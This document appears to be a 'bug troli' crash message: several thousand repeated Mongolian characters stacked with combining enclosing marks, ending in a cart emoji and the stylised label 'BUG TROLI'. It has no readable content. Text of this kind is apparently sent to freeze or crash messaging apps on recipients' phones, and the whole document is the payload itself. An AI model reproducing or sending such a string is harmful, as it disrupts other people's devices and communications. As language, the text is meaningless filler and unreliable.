ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ🛒𝐁𝐔𝐆 𝐓𝐑𝐎𝐋𝐈🎈
